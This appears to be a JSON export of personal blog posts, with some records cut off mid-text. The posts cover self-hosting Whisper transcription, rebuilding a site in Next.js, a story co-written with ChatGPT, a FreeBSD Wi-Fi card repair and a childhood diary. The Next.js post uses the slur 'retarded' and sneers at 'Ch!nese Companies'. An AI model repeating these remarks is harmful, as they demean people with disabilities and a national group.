want to charge\npeople money\u2014they have all those running GPUs in the background. The raw\ncosts and maintaining them are really expensive, and like, you have to\nhave much more available than the normal workload. Those companies don\u2019t\nturn on and turn off those GPUs like I do when I was doing homework for\ncustomers, though, because it has to be readily available.</p>\n<p>Then there are 3rd party API services, like Whisper APIs. But those\nare still very expensive. Transcribing an hour of audio costs around 0.2\ndollars. Comparably much cheaper than freaking Veed Premium, which is\nlike 20 dollars a month to use for like 100 minutes of transcription\nservices! Those commercial companies wrap everything up in fancy\nfrontend frameworks, and you never know how expensive they charge!</p>\n<h2 id=\"transcribing-services\">Transcribing services</h2>\n<p>Running OpenAI Whisper on CPU is so slow! It goes on forever for\ntranscribing 30 seconds. It\u2019s just very, very slow and my computer\u2019s fan\nwas complaining all the time.</p>\n<p>Distilled Whisper doesn\u2019t support other languages, only English. I\nwas like: I don\u2019t need to transcribe English, I can hear words clearly\nno matter.</p>\n<p>So I chose Faster-Whisper, which is much faster, and generally\naccurate enough for me.</p>\n<p>There\u2019s also \u201cInsanely Fast Whisper,\u201d except it\u2019s not available on\nCPU. I have no idea, since like the point of quantization is for models\nto run on fewer resources.</p>\n<p>To be honest, strangely Whisper sometimes doesn\u2019t catch one word in a\nsong, but Faster Whisper does well with songs.</p>\n<p>Linode 8GB costs $0.072 an hour, and running Faster-Whisper on it for\nan hour can transcribe about a 2-hour video, which is much cheaper than\nthe API services, although one might argue it\u2019s not that scalable. Given\n100 hours of audio, it takes that long to translate on Linode, but with\none click of an API (since it\u2019s designed to scale), you can produce the\nresults. It\u2019s probably 10 times cheaper than the third-party stuff, but,\nI don\u2019t think the third-party companies did quantization, though.</p>\n<p>There\u2019s also Dropbox which offers free transcribing for uploaded\nvideos, not that I like Dropbox or something. In fact, there are so many\nof those companies offering nowadays, like YouTube\u2019s default\ntranscription(which is weird and I still haven\u2019t figured it out,\nsometimes it is good other times it is disabled, and very bad).</p>\n<h2 id=\"react-theme\">React Theme</h2>\n<p>There is a Dark Reader npm library to implement different themes and\nit\u2019s extremely easy and popular! I wished I had used that instead of\nmanually implementing a dark theme with React\u2019s context api for my\npersonal website before.</p>\n<p>But the iframe was a big trouble. Actually it\u2019s my first time\nimplementing iframes so like they are a big headache. Passing props to\nthe iframe page doesn\u2019t work to iframes on a page, and I tried about 2\nhours to manipulate the iframe with previous methods and failed. Then I\nused the send message api and it worked good, just basically send a\nmessage to the iframe, and let it handle the message and toggle the\ntheme.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Self-hosting is awfully addictive and fun, aiming to get rid of\n\u201cnecessary\u201d proprietary commerical bloated platforms. But it\u2019s kinda\nlimited as well, and maintaining cost real lot of efforts. For example,\nthe bugs of in frontend react is a constant headache(actually I hate\nfrontend now). I can enjoy videos with subtitles and watch them\nanywhere.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.mongodb.com/security\">MongoDB Security Best\nPractices</a></li>\n<li><a href=\"https://www.linode.com/docs/\">Linode Documentation</a></li>\n<li><a href=\"https://github.com/nagadomi/waifu2x\">Waifu2x</a></li>\n<li><a href=\"https://wiki.archlinux.org/title/nginx/\">Nginx\nConfiguration</a></li>\n<li><a\nhref=\"https://github.com/OpenNMT/CTranslate2\">CTranslate2</a></li>\n<li><a href=\"https://github.com/openai/whisper\">Whisper by\nOpenAI</a></li>\n<li><a href=\"https://github.com/guillaumekln/faster-whisper\">Faster\nWhisper</a></li>\n<li><a href=\"https://darkreader.org/\">Dark Reader</a></li>\n</ul>\n", "_id": "66689634547d3fe098118753"}
{"title": "Redesigning Website with Nextjs", "date": "Thu May 30 2024 04:24:01", "type": "web-dev", "body": "<h2 id=\"what-happened\">What Happened?</h2>\n<p>So my old website is retired now. I used React Bootstrap to code\nit.</p>\n<h2 id=\"why\">Why?</h2>\n<p>Because I don\u2019t like Bootstrap anymore. Bootstrap was the first thing\nI jumped into when I studied web dev, and it was the only framework I\nknew. I designed 4 websites with it, my own website, my video tube, a\nsite generated after web scraping, and a shitty homework assignment.</p>\n<p>After the first time like React Bootstrap was like the de facto for\nme in web developing, and like there are a whole bunch lot of stuff out\nthere, like Vue, Angular, Svelte, etc. But like with limited time I\nquickly settled on my first framework.</p>\n<p>So like my old personal website was once very neat and small, then it\ngradually got bloated and filled with all sorts of stuff. I kept adding\nthings to it and made hundreds of commits.</p>\n<p>So like the first version was back in June 2023, and I just used it\nto display my blogs and let people leave a message, nothing serious.\nWhat motivated me was like I couldn\u2019t get satisfied with one of those\ngithub pages, like I changed something to what I wanted and it would\nerror and I would literally sit there for hours not knowing what to\ndo.</p>\n<p>So anyways, long story short, I started learning and after 3 weeks my\nwebsite was born. It just displayed my blogs and visitinfos and a\nmessage box.</p>\n<h2 id=\"complexity-vs-simplicity\">Complexity vs Simplicity</h2>\n<p>Over time there was more and more functions on my website,</p>\n<ol type=\"1\">\n<li><p>In version 1 I added Comment and Likes to my Blogs, so anyone can\nlike any blog and could comment on any blogs. That was the end of summer\nin 2023. <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-05-30%2023-05-11.png\"\nalt=\"alt text\" /></p>\n<p>That was also the time I decided to stop using GUIs in servers.\nPreviously I was overwhelmed by the complexity of systemd(what a joke).\nI also didn\u2019t understand npm really well. So I was like, I couldn\u2019t do\nanything without a GUI, and I felt lost and hopeless working in the\nLinode shell.(ridiculous as hell right?)</p>\n<p>Anyways, I followed the guide step by step and installed vnc and\nubuntu-desktop,(guys, Ubuntu-desktop, not even vanilla gnome, literally,\non a server, the bloated crap), and connected to it with vnc.</p>\n<p>Well, you know what, I hate vnc so much now, it is just buggy and\nunnecessary. Why sacrifice the simplicity of a command line for\nsomething much more complicated?</p></li>\n<li><p>In version 1 2 added Blog Types and Blog sidebars. So people can\ngo to my preview page. That was in October 2023, and I<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-05-30%2023-03-58.png\"\nalt=\"alt text\" /></p></li>\n<li><p>In version 3 I rewrite the whole code again. Literally at this\npoint there was all those <code>style={{}}</code> in my code just\neverywhere and I used vanilla CSS without utilizing te React Bootstrap\ncomponents(which is so stupid). I also implemented a search function and\nadded latex support(just using MathJax), and different color themes.\nThat was in November 2023.</p></li>\n<li><p>In version 4 there wasn\u2019t much changes. I just added personal\nlogs(I wanted to do some note-taking or stuff, kinda like Joplin or\nNotion), and I fixed bugs in themes in the prev version.</p>\n<p>However, though, the log turned out the be a total failure, and I\nended up not using it after all. I knew better now than to use something\nI wrote myself in daily life, it was just unstable and lacks lots of\nfeatures.</p></li>\n<li><p>In version 5 the focus was on the server side. I deleted lots of\nstuff like logs and messages(nobody leaves a message for months). I\nadded a selfhosted PhotoPrism link, a self-hosted Uptime-Kuma for\nmonitoring.</p>\n<p>I realized I was (all the time) constantly ran\n<code>sudo npm start</code> for my website, which is quite stupid. I\nshall do <code>npm run build</code> for production builds and for nginx\nLMAO.</p>\n<p>I wrote a setup script and streamlined the deployment. I used nginx\nand letsencrypt for https, and dumped the monogdb(so I can restore it),\nadded systemd services to setup and update.</p></li>\n</ol>\n<h2 id=\"what-i-didnt-like-about-the-website\">What I didn\u2019t like about\nthe Website</h2>\n<p>There are several things, including, the like function.</p>\n<p>Well first of all I wanted initially to design a like function for\nblogs and comments(turns out nobody visits my damn website so it was\nuseless junk after all). And you know I must implement some way to\nprevent somebody from liking it twice. Well what first came in mind was\nobviously some log in measures(that was too hard to implement), so I\nsettled on logging the ip address.</p>\n<p>This is a bad idea as it depends on some third party(ipapi.co/json to\nbe specific), and also making a request takes some time(although\nunnoticeable). There wasn\u2019t any traffic, like, ever, to my website, and\nI got fewer than 10 likes(even from myself) in the whole lifespan of the\nwebsite so like it was really really useless.</p>\n<p>Basically implementing a like function is useless and bloating things\nup. And the sad thing was I implemented it on the initial version, and\nit is kind of complicated as literally everythign depends on the ip as\nthe identity.</p>\n<p>Another thing that bloated up was the theme. So initally I\nimplemented the theme by writing some theme colors for everything, so\nlike</p>\n<pre class=\"js\"><code>updateColor(&quot;color_white&quot;, &quot;#1a1a1a&quot;);\nupdateColor(&quot;color_black&quot;, &quot;#ffffff&quot;);\nupdateColor(&quot;color_blue_1&quot;, &quot;#6aff6a&quot;);\nupdateColor(&quot;color_blue_2&quot;, &quot;#00ff00&quot;);</code></pre>\n<p>using this to wrap everything around instead of utilizing dark reader\nlibrary, which greatly complicates the code.</p>\n<h2 id=\"how-the-old-website-looked\">How the old website Looked</h2>\n<p>https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-05-30%2023-08-41.png</p>\n<p>https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-05-30%2023-09-27.png</p>\n<h2 id=\"why-is-wrong-with-react-bootstrap\">Why is wrong with React\nBootstrap?</h2>\n<p>Nothing, just Bootstrap is quite old, and it made these WEIRD LITTLE\nBOXES. Literally they are so freaking ugly.</p>\n<p>It\u2019s not like companies don\u2019t use bootstrap, because I realize some\ncompanies using Bootstrap very quickly when they have these weird little\nboxes too, like some illegal phone selling companies. And sure it is\nbootstrap in the browser debug console.</p>\n<p>Literally the worst thing is those weird little boxes, and they make\nthe website looks not nice. Anyways, React Bootstrap is OK, not bad.</p>\n<h2 id=\"why-do-i-want-to-change\">Why do I want to change?</h2>\n<p>Generally because my website is getting too bloated for things I\ndon\u2019t want to be there, and it turned out even less popular than I\nexpected it to be.</p>\n<p>Also think about it, when you literally don\u2019t like a function\nimplemented on the website why do you expect others to like it? It is\nlike those Ch!nese Companies that implement the trash softwares and\nexpect people to use or the retarded computer science teacher that reads\noff the ppt without knowing what git is. Like literally I think what we\nshould demonstrate to the world should be minimalistic and be to the\npoint instead of bloated and shitty.</p>\n<p>Like the stupid visitinfos and status and all those stuff in my old\nwebsite are pretty useless though. Literally in a time when code is\nexploding everywhere, it is important to stay simple and stay true.</p>\n<p>Like some personal websites which points to large amounts of garbage\npicked from somewhere claiming its \u201cinteresting\u201d. Well, if you are not\ninterested and organizing your stuff I am not gonna get interested\nanyway.</p>\n<p>There is nobody visiting my website and I don\u2019t expect anybody to in\nthe future but my point is that I just don\u2019t need that much\nfeatures.</p>\n<h2 id=\"why-do-i-want-to-use-nextjs\">Why do I want to use NextJS?</h2>\n<p>Nextjs really have some good practices, it preconfigures lots of\nthings.</p>\n<ol type=\"1\">\n<li>It streamlines the frontend and backend together, so no need for\nproxying some weird ports to <code>/api</code> in nginx and no need for\n2 services to start simultaneouslya nd no need for cors.</li>\n<li>It uses those api routes predefined ot be the name of the file so\nyou don\u2019t have to like include a file every time you add a file or\nroute(really frustrating though).</li>\n<li>The frontend is also very convenient as it simplifies things to\n<code>pages.tsx</code></li>\n<li>Using tailwind css is really convenient! It simplifies frontend\ncoding so much and you don\u2019t have to learn <code>css</code>, instead\njust defining html class is enough!</li>\n<li>Big companies are using it! Like, literally, it is really\npopular.</li>\n</ol>\n<p>People say you can even write sql queries in the frontend(although I\nwould never try that).</p>\n<p>As somebody put it, \u201cNextjs is putting a lot of best practices\ntogether simplified to make a modern sleek website\u201d.</p>\n<h2 id=\"what-do-i-have-in-my-website-now\">What do I have in my website\nnow?</h2>\n<p>After a long heated debate with myself simplicity wins. Simplicity\nalways win when I battled myself.</p>\n<p>So right now I have an about page with resume and my blog and some\nlinks and nothing else. I have like 3 things in my website.(The links\nare in the footer so that counts as 2).</p>\n<h2 id=\"changing-the-annoying-boxes-displaying-blogs\">Changing the\nAnnoying Boxes displaying Blogs</h2>\n<p>So like displaying blogs vertically on a whole page is just ugly. I\nmean it. So I chose to display them inside a box on the left hand side\nof the website.</p>\n<h2 id=\"about-frontend\">About Frontend</h2>\n<p>As much as I was into frontend design, doing a frontend job was just\nnot my thing. It is different between a hobby vs your work. Well, I am\nnot saying absolutely not, because if someday I am starving and there\nwas a good frontend job with decent pay I would undoubtedly go and do\nit.</p>\n<p>Frontend is one of those areas in computer science that lacks depth\nand one can easily do it. It\u2019s like quite useless for someone delving\ndeep into research(though there might be some research in frontend). It\nis useful to understand how it works, to look into the debug console and\nwrite a few scrapers, to change the cookie and see what happens, to\nwrite a react website whatever. However, it is pretty useless for me now\nafter I got used to it.</p>\n<p>What\u2019s ironic is about how much people around me like understand\nfrontend. When I was in Berkeley I felt like literally everybody learned\nfrontend(there was like at least 3-4 decals with 200 people each and at\nleast 10 clubs teaching frontend). But here I am in USTC when I was like\nsaying React people say they never heard about it. VB is still\npopular(LMAO my programming nightmare literally), and knowledge is just,\noutdated here.</p>\n<p>And in the crappiest database course ever the outdated teacher force\nyou to write a frontend (????), instead of designing a database. he was\nlike \u201cfrontend was everything\u201d, and \u201creally impressed people can do\nKotlin or IOS developement\u201d, LMAO what a stupid course, like he was\nassuming students don\u2019t have brains, and it was one of the best courses\nthis semester that at least got a decent website with https and decent\nTAs. The teacher also really liked closed source database, like \u201cOracle\u201d\nor \u201cMicro$oft\u201d and didn\u2019t even talk about interesting ones like Postgres\nor MongoDB. I lost motivation to study and got addicted to servers and\nfrontends and cloud more than I was addicted to gaming before and stayed\nup endless nights hooking up with them these days and there was just no\nway to get back to this shitpile.</p>\n", "_id": "66689634547d3fe098118754"}

This year, however,\nsomething felt different. As Sarah and Ethan walked to the old treehouse\nin his backyard, she noticed a for sale sign on the lawn of the house\nnext door.</p>\n<p>The next day, a moving truck pulled up. From her bedroom window,\nSarah watched as a family unloaded their belongings. Among them was a\nboy about their age, wearing a baseball cap and looking around\ncuriously.</p>\n<p>\u201cWe should go say hi,\u201d Ethan suggested, already halfway down the\nstairs.</p>\n<p>Sarah hesitated for a moment, then followed. As they approached the\nnew neighbors, the boy noticed them and smiled.</p>\n<p>\u201cHey, I\u2019m Jake,\u201d he said, extending a hand.</p>\n<h2 id=\"my-part\">My Part</h2>\n<p>Jake is a smart and quiet boy, shy, but very easygoing and polite. He\nwould usually watch them play, with curiosity and a smile, not too big,\njust enough to cover the corners of his cheeks.</p>\n<p>\u201cWanna have some fun, Jake? Maybe we can play hide and seek in\nEthan\u2019s house?\u201d said Sarah.</p>\n<p>\u201cShh, isn\u2019t Ethan\u2019s mom a nighttime worker and usually sleeping this\ntime? We shouldn\u2019t bother her!\u201d said Jake.</p>\n<p>\u201cYou guys wanna go to the park? There are some other kids there we\ncan hang out with!\u201d said Ethan.</p>\n<p>\u201cGood idea! Maybe the park is close to the library so I can pick up\nsome books there when we are coming back!\u201d said Jake.</p>\n<p>\u201cSuch a nerd\u201d mumbled Sarah</p>\n<p>Jake was indifferent. Ethan raised an eyebrow but caught himself and\nsaid. \u201cYeah, there is also an awesome pizza shop near the Park on\nGlimoth Avenue near Main Street, wanna eat thereafter? Delicious food!\nWe can guide you around here too!\u201d</p>\n<p>\u201cOh thank you so much, you are so nice!\u201d replied Jake.</p>\n<p>\u201cwell let\u2019s go now,\u201d said Sarah.</p>\n<p>As they headed to the park, the sun was high in the sky, casting long\nshadows along the sidewalk. Sarah led the way, with Ethan and Jake\nfollowing closely behind.</p>\n<p>\u201cSo, Jake, what kind of books do you like to read?\u201d Sarah asked,\ntrying to bridge the gap after her earlier comment.</p>\n<p>\u201cMostly nonfiction, I like science and history,\u201d Jake replied, his\neyes lighting up. \u201cThere\u2019s always something new to discover.\u201d</p>\n<p>Ethan looked uninterested but tried to hide. Sarah replied, \u201cOh,\nthat\u2019s borrring.\u201d</p>\n<p>Ethan said, \u201cHey, Sarah don\u2019t be mean!\u201d</p>\n<p>Jake just quietly goes on, still a smile and not offended.</p>\n<p>As they go to the park there are some small children, much younger,\nsome sitting on their parent\u2019s lap and in a child section of the\npark.</p>\n<p>\u201cHaha, these children so small and knows nothing! Only kidies play\nwith parents!\u201d said Sarah.</p>\n<p>Jake quietly followed, \u201cNice park here, thank you for showing me,\nthere weren\u2019t a lot of parks back in my city, it was so crowded and\nbuzzing for people to enjoy.\u201d</p>\n<p>Sarah replied, \u201cBoy life in the city is bad doesn\u2019t it?\u201d</p>\n<p>Jake again, looked down and didn\u2019t reply.</p>\n<p>Ethan changed the topic, \u201cYeah like we spend all childhood lives\nright here, so it feels warm and like home, how was your childhood,\nJake?\u201d</p>\n<p>Jake paused for a moment, thinking back to his life in the city. \u201cIt\nwas different. Busy streets, lots of noise. I spent a lot of time\nindoors, reading books or working on my computer.\u201d</p>\n<p>Sarah jammed in, \u201cOh, like those Couch Potatoes?\u201d</p>\n<p>Ethan got very angry, \u201cHey, you promised not to be mean, please, or\nelse you can just go home now, we don\u2019t need you.\u201d</p>\n<p>Sarah replied, \u201cLol haha, whatever, as if I need you?\u201d</p>\n<p>They continued in silence for another 5-7 minutes, when Sarah saw her\nclassmate, Lexi, Lexi was tall and thin, and one of Sarah\u2019s best\nfriends.</p>\n<p>Along with Lexi is Tina, a medium-height girl with glasses, very\nfashionable. Tina is also friends with Sarah and Lexi. \u201cWanna go to\nmovies with us, Sarah?\u201d yelled Tina.</p>\n<p>\u201cSee ya!\u201d Cried Sarah as she jumped and went to join the other 2\ngirls.</p>\n<p>Now Ethan and Jake are left alone. Ethan was apologetic, \u201cYou see,\nSarah was very chill when we were young, but these years changed, and\never since she became friends with the fashionable girl\u2026\u201d</p>\n<p>They found a spot near the swings, and Ethan plopped down on the\ngrass. \u201cSo, Jake, what kind of things do you like to do besides\nreading?\u201d</p>\n<h2 id=\"chatgpts-change\">ChatGPT\u2019s Change</h2>\n<p>Jake sat down too, fiddling with the hem of his shirt. \u201cI like\ncollecting old coins. They help me learn about science and history.\u201d</p>\n<p>Ethan said, \u201cOf course! I\u2019d love to see your coin collection. How\nabout this weekend? I can show you the museum on Lufurd Road and a great\ncaf\u00e9 nearby. Both are just five blocks from the library!\u201d</p>\n<p>Jake smiled, feeling relieved. \u201cThat sounds awesome. I\u2019d love to\ncheck out the museum and the caf\u00e9. Thanks for being so welcoming,\nEthan.\u201d</p>\n<p>They left the park and headed to the library, where Jake picked up\ntwo books on history and science. Lost in his reading, Jake would\nsometimes point, \u201cIsn\u2019t this drawing of the sphere beautiful, Ethan?\nLook at this analysis of the population over the past 10 years. Don\u2019t\nyou see some trends?\u201d</p>\n<h2 id=\"my-part-continuted\">My Part Continuted</h2>\n<p>Ethan, on the other hand, looked bored and went around picking at an\naction themed book, pretending to read. Though, mostly he was glancing\nat his phone, occasionally laughing, not clear if it was from the book\nor his messages with his girlfriend, Jennifer.</p>\n<p>After a while Ethan seemed to stop looking at his phone that much,\noccasionally looking around, and finally \u201cJake, can we leave? it\u2019s\nalmost 6 pm and the library is closing and it\u2019s dark.\u201d</p>\n<p>Jake looked up, his heart still immersed in the books, \u201cOh, so sorry,\nI got lost again, yeah, let\u2019s go to the pizzas!\u201d He went to check out\nhis book, only to find he was a new resident here and didn\u2019t have a\nlibrary card.</p>\n<p>\u201cOh umm, so you can only come on weekdays 9-12 for a new library\ncard, sorry honey\u201d librarian Grace greeted them.</p>\n<p>\u201cNo worries, I can borrow them, use my card!\u201d Said Ethan. Jake\nreplied thanks.</p>\n<p>\u201cOh, are you the new child here? Maybe you can meet my son, Jeremy,\nhe\u2019s in high school!\u201d said Grace, smiling at Jake.</p>\n<p>\u201cOh yeah, I would like that,\u201d said Jake, \u201cDo you know if he is in the\nsame high school that I am going to attend?\u201d</p>\n<p>\u201cHey, a small town here, only one high school.\u201d Laughed Ethan, as\nJake handed the library card back to him and put the books into his\nbag.</p>\n<p>\u201cHow is Jeremy?\u201d Jake asked as they walked towards the pizza\nshop.</p>\n<p>Ethan shrugged. \u201cHe\u2019s cool, always into new things, and adventurous.\nHe is passionate about things he loves, and not so much about things he\ndoesn\u2019t.\u201d</p>\n<p>Jake chuckled. \u201cSeems interesting, what are his hobbies?\u201d As they\nwent inside the pizza shop.</p>\n<p>As they reached the pizza shop, the inviting smell of freshly baked\npizza wafted through the air. They found a table near the window and sat\ndown, looking over the menu. Ethan said, \u201cWell, you know, Jeremy\u2019s\ninterests are quite unpredictable, used to be cars and bikes and\nmotorcycles, now it\u2019s maps and all different languages out there, he\nwants to travel to 200 countries in the world.\u201d</p>\n<p>Jake said \u201cCool!\u201d when a waitress, with the name tag, Blandon Pleck,\ncame to them with menus, \u201cHandsome young guys, what do you want?\u201d\npausing a bit, \u201cOh, and you new here, welcome!\u201d</p>\n<p>Jake reached out a hand, \u201cJake.\u201d</p>\n<p>Blandon shook his hand, \u201cCall me Mrs.\u00a0Pleck! We got the best pizza in\ntown, and it is homemade, oh you would like it, there is nothing like\nthat where you\u2019re from, I reckon!\u201d</p>\n<p>Jake smiled but said nothing, and looked down. \u201cWell, quite different\nfrom the city restaurants, there are more options and some I\u2019ve never\nseen before!\u201d</p>\n<p>Ethan looked up from his phone in messages with Jennifer, \u201cSure! So,\ndo you miss the city at all?\u201d Ethan asked.</p>\n<p>Jake thought for a moment. \u201cA little. But it\u2019s too early to tell.\nIt\u2019s quieter, and people seem friendlier.\u201d</p>\n<p>Ethan nodded.</p>\n<p>Ethan and Jake walked out of the restaurant, there was Jennifer.\nEthan ached out with a big hug. \u201cAhh, sweetie, how\u2019s it going in the\ndance club today?\u201d</p>\n<p>Jennifer replied \u201cYeah, everything going well, can\u2019t wait for the\nexhibition! Oh, and this is?\u201d</p>\n<p>\u201cJake\u201d, said Jake, holding out a hand.</p>\n<p>\u201cNice to meet you! I\u2019m Jennifer.\u201d</p>\n<p>\u201cJake is very fun and cool to be with. Yeah, we were hanging out with\nSarah when she said some mean words and ran off with Tina and Lexi.\u201d\nSaid Ethan.</p>\n<p>\u201cYeah, these girls are pretty mean, Jake you wanna come to the\nexhibition on the 10th of June?\u201d said Jennifer.</p>\n<p>\u201cSure, would love it!\u201d said Jake.</p>\n<p>Ethan and Jennifer hold hands while walking home, and Jake trailing a\nlittle behind, but not feeling left out. Ethan and Jennifer talked about\ntheir lives, about Ethan\u2019s part-time morning jobs in Caslos, a\nconvenience store owned by Jennifer\u2019s father, while Jennifer talked\nabout her dance lessons and intense preparation for the exhibition, and\nonly a few hours of free time at night every day, even though everyone\nelse was having fun in summer.</p>\n<p>\u201cOh, and I think it is worth it. Dancing is part of my life and\nshapes who I am. There are fewer more meaningful things than that.\u201d said\nJennifer</p>\n<p>\u201cHa, just like Jake loved reading nonfiction!\u201d said Ethan.</p>\n<p>\u201cCool! My dad also likes history. My family\u2019s been here for more than\n100 years, and we have some old drawings and documents,\u201d said\nJennifer.</p>\n<p>They walked on in dim light from the streetlamps.</p>\n<p>\u201cSee you tomorrow morning at the Caslos! it\u2019s down the street and on\nGlymoth Avenue!\u201d said Ethan as he waved goodbye.</p>\n<p>The next morning Ethan arrived at Caslos with Jake. \u201cOh hello, who is\nthis?\u201d said Mr.\u00a0Morson.</p>\n<p>\u201cMr.\u00a0Morson, Jake. new kid here, Jake, Mr.Morson, this is Jennifer\u2019s\nfather.\u201d Ethan talked quickly.</p>\n<p>Ethan worked a part-time job at Mr.\u00a0Morson\u2019s grocery store,\noccasionally greeting customers and counting the bills in the morning\nhours. \u201cOne of the finest dudes here\u201d, Mr.\u00a0Morson would always say.</p>\n<p>In the summer it gets pretty hot and there are some mosquitos. \u201cThere\nare no ACs, it\u2019s unnecessary and saves money. Besides, it\u2019s not Texas,\nit\u2019s relatively cool and bearable here.\u201d said Ethan, \u201cAs for mosquitos,\njust bear with them.\u201d</p>\n<p>Ethan and Mr.Morson loaded the goods from the trucks at around 10 am.\nJake, sitting quietly in a back corner of the store, doing his math\nhomework.</p>\n<p>\u201cOh, you could do that?\u201d said Mr.Morson, sweats dripping off the huge\nman\u2019s shoulders as he waved the truck driver off.</p>\n<p>END FOR NOW</p>\n", "_id": "66689634547d3fe098118755"}
{"title": "Exploring BSD: Incompatible Wireless Card", "date": "Tue Apr 09 2024 12:50:00", "type": "bsd", "body": "<h2 id=\"incompatibility\">Incompatibility</h2>\n<p>Today I decided to play around with the BSD distros. I have used many\nLinux distros and found they are pretty much alike, no big difference\nanyways except for package managers. Anyways, I hopped on to the FreeBSD\nwebsite and flashed the ISO to my usb.</p>\n<p>BSD distros are pretty much like Linux in the application level, they\ncan also run Gnome or Kde Plasma or whatever, pretty much everything\nLinux runs.</p>\n<p>I installed the FreeBSD distro but there was a wifi card problem, and\nthere was just no way to solve it. On researching I found my old laptop,\nwhich is Honor Magicbook, has this <code>RTL8822CE 802.11ac</code> as\nits wireless card, and I can\u2019t get it to work correctly in FreeBSD.</p>\n<p>It was very frustrating and I tried <code>wpa_supplicant</code> many\ntimes, all failing. <code>ifconfig</code> couldn\u2019t detect the\n<code>wlan0</code>.</p>\n<p>Then I installed GhostBSD with Mate as DE because it was too\nfrustrating working in that headless environment and it turns out this\nproblem still couldn\u2019t be solved. I tried connecting via the graphic\nInterface, and it failed. Another reminder that graphic interface is\nmore or less useless\u2013you either solve it or you don\u2019t.</p>\n<p>Then I tried to use <code>wpa_supplicant</code> again, it complained\nabout \u201cioctl 80221\u201d and stuff. When rebooted I could see both\n<code>wlan0</code> and <code>eth0</code> with <code>ifconfig</code> but\nwhen I try <code>service netif restart</code>, it would destroy the\n<code>wlan0</code> interface.</p>\n<p>I think the main issue lives within the driver for the card. So in\nthe meantime changing the card seem to be a good idea to experiment.</p>\n<h2 id=\"changing-the-realtek-card\">Changing the Realtek Card</h2>\n<p>So off I went around all around Hefei for computer repairing stores.\nMy laptop is a Honor Magicbook. First I hopped on the bus to HongGang,\njust several kilometers down the road. I went there and there was a\nHonor store, however, they say they can\u2019t fix it.</p>\n<p>I went to JingDong computer repairing store, and there was a man\nsitting inside a room playing his mobile phone. I went in and asked and\nthey said there wasn\u2019t a wireless card available, and that my system is\n\u201cweird\u201d, they never seen anything like it before, obviously not knowing\nanything about it. The man tried to insert a usb drive for wifi, but it\ndidn\u2019t work, and he frowned from the start to the end looking at Mate\nDesktop. I asked further and they said I would need to buy the card\nmyself and it would need 80 RMB to fix it with my card.</p>\n<p>Then I went to the Honor after-sales service store, and they looked\nvery annoyed after seeing my laptop, claiming they never seen such\nsystems and they could only fix and repair with their \u201cofficial\nsystems\u201d, which of course is crappy Windows. The man said \u201cyou probably\nknow what you are doing and more than me\u201d. Anyways, there wasn\u2019t much I\ncould get out of them. I tried to ask if they would replace my wireless\ncard but they refused, saying they could only give me their wireless\ncard(rtw880).</p>\n<p>Anyways, then I eat at a KFC, and hopped on another bus, going to\nanother computer repair store\uff0c just north of National Defense\nTechnology University. There was 3 person in it, and when I asked if\nthey could repair the computer for me they replied yes, but they\ncouldn\u2019t solve the problem, claiming they never saw the system and it\nwas beyond their knowledge. Anyways, I asked if they could change the\nhardware stuff and they said they don\u2019t have a wireless card available,\nand I need to buy one, and offered 50 RMB to change it. Then I got\nout.</p>\n<p>I tried walking to the fourth computer repair store, which has\n\u201ccomputer assembling\u201d in its name. It is around little less than a\nkilometer. But I walked there it was among torn-down houses, and the\nstore is closed, and around me there was a million stalls selling all\nkinds of street foods, so much it almost blocked the road. People were\nhaving fun eating and talking to each other around me.</p>\n<p>Then I was very frustrated. I got on line 2 and went to Sanxiaokou\nstation, and I went to another computer repair store called Didi repair.\nIt was on floor 13 on a building. I went up and called the person, and\nhe said he would come in 5 minutes. Anyways it is mainly a door-to-door\nservice. I went in and showed him the wireless card problem, and he was\nkind of amazed and said he hadn\u2019t seen the system either. I told him it\nwas BSD, and showed an article saying FreeBSD is amazing! Anyway, the\nman seemed very enthusiastic and easy-going, and offered to change the\nhardware for me. He is very friendly and we chatted a while, he saying\nthat people are too impetuous nowadays. I expressed my strong interest\nin computer systems(or just playing, anyway).</p>\n<p>After that he got the tools, and he said he had an Intel Wireless\nCard from a computer from the 2010s, and he offered to fix it for me. He\nopened the Honor Magicbook and switched the Intel into it to replace to\nRealtech card.</p>\n<p>He asked if I use Linux, and I said I used Linux as a daily driver.\nHe said the repairing technicans are mainly vocational school grads, and\ndoesn\u2019t know much about systems. He seemed very interested in command\nline operations and watched me as I stumbled around with\n<code>vi</code>. I edited the <code>/etc/rc.conf</code> and changed the\n<code>/etc/resolv.conf</code> and restarted the network. Then I edited\nthe <code>wifi.conf</code> to be the network wifi of his office. I was\nvery clumsly in the new system because I have been using Linux pretty\nmuch all the time and I was very clumsy with <code>vi</code>. I was\nalways typing <code>nano</code>, <code>gedit</code>,\n<code>systemctl</code>, <code>journalctl</code> or commands like that\nfrom my muscle memory. Anyways after a long stumble I finally configured\nthe <code>wpa_supplicant</code> to connect to wifi, and got an ipv4 with\n<code>dhclient</code>, then opened firefox, and I could go on\nwebsites!</p>\n<p>I was pretty overjoyed and satisfied with the journey, and I thanked\nthe man and paid 800 RMB. He said I am welcome to hang around at other\ntimes. I find this man very friendly and easygoing\u2013he took some pictures\nof the Mate Desktop and Fish Shell, saying he never seen such in his\nlife, and he had a few Linux experiences. Then he said there is another\ncustomer using Linux, and maybe I could help whatever. I added WeChat\nand I went home.</p>\n<h2 id=\"wifi-connection-summary\">Wifi Connection Summary</h2>\n<h3 id=\"check-network-interfaces\">Check Network Interfaces</h3>\n<p>Run the command <code>ifconfig</code> to list the active network\ninterfaces.

I came home at\nmidnight and was not tired at all because I slept a lot on the plane. I\nturned on the lights and read a book by Ann M Martin. I didn\u2019t look up\nfor three hours when reading and realized that it is morning by the time\nI finished.</p>\n<p>I played for two days. On the third day, which is pretty hot, we\nmoved. We lived far from my middle school, so my family and I decided to\nmove to a nearer house. The new house is on the twenty-ninth floor. Then\nI went to the military training in our school. It\u2019s so boring that I\ndidn\u2019t want to do it. The teacher makes us do things like calling\nnumbers one by one and standing. It is so stupid and dumb. Later I read\nin a newspaper that Americans don\u2019t have to do military training. I kind\nof wished I was born in America so that I could skip military training.\nThen finally the last day arrived. We had a competition between classes\nto see which class does the best in the training. To my surprise, our\nclass won out of nine classes and got a prize. Then the new semester\nstarted.</p>\n<p>There are many differences. I used to finish my homework at five or\nsix o\u2019clock in the evening in 